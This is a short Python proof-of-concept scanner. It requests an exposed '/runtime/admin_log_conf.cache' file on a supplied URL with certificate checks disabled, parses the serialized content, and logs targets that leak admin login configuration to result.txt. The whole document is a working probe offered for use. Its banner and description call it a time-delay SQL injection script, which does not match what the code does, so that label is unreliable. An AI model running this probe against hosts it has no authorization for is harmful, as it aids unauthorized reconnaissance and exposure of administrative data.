import re
import time,requests,argparse
requests.packages.urllib3.disable_warnings()
def banner():
    test = """sqli_sleep.py"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="这是一个延时注入脚本")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter url')
    args = parser.parse_args()
    poc(args.url)
def poc(target):
    payload = '/runtime/admin_log_conf.cache'
    headers = {
        'user-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
    }
    try:
        res1 = requests.get(url=target + payload, timeout=10, headers=headers, verify=False)
        content = re.findall(r's:12:"(.*?)";',res1.text,re.S)
        if '/login/login' in content:
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(target + '\n')
        elif res1.status_code == 200:
            print(f"[+]该{target}可能存在问题请手动测试")
        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()